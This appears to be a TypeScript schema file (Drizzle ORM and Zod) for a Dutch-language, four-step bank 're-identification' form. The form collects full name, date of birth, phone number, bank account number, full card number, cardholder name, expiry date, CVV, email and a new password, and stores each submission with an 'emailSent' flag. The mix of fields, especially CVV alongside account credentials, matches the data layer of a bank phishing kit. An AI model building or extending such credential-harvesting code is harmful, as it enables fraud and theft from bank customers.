import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, json } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const reidentificationSubmissions = pgTable("reidentification_submissions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  submissionData: json("submission_data").notNull(),
  submittedAt: timestamp("submitted_at").defaultNow().notNull(),
  emailSent: text("email_sent").default("false").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export const insertReidentificationSchema = createInsertSchema(reidentificationSubmissions).pick({
  submissionData: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type InsertReidentification = z.infer<typeof insertReidentificationSchema>;
export type ReidentificationSubmission = typeof reidentificationSubmissions.$inferSelect;

export const formDataSchema = z.object({
  // Step 1
  username: z.string().min(1, "Gebruikersnaam is verplicht"),
  fullName: z.string().min(1, "Volledige naam is verplicht"),
  accountTypes: z.array(z.enum(["private", "business", "creditcard"])).min(1, "Selecteer minimaal één rekeningtype"),
  
  // Step 2
  idType: z.enum(["passport", "id-card", "drivers-license"], {
    required_error: "Selecteer een type identiteitsbewijs"
  }),
  fullNameConfirm: z.string().min(1, "Bevestig je volledige naam"),
  dateOfBirth: z.string().min(1, "Geboortedatum is verplicht"),
  phoneNumber: z.string().min(1, "Telefoonnummer is verplicht"),
  accountNumber: z.string().min(1, "Rekeningnummer is verplicht"),
  cardNumber: z.string().min(1, "Kaartnummer is verplicht"),
  cardName: z.string().min(1, "Naam op kaart is verplicht"),
  expiryDate: z.string().min(1, "Vervaldatum is verplicht"),
  cvv: z.string().min(3, "CVV moet minimaal 3 cijfers zijn"),
  
  // Step 3
  missingData: z.array(z.enum(["middlenames", "address", "birthplace", "nationality"])),
  fullEmail: z.string().email("Ongeldig e-mailadres"),
  newPassword: z.string().min(6, "Wachtwoord moet minimaal 6 tekens zijn"),
  
  // Step 4
  consent: z.boolean().refine(val => val === true, "Toestemming is verplicht"),
});

export type FormData = z.infer<typeof formDataSchema>;
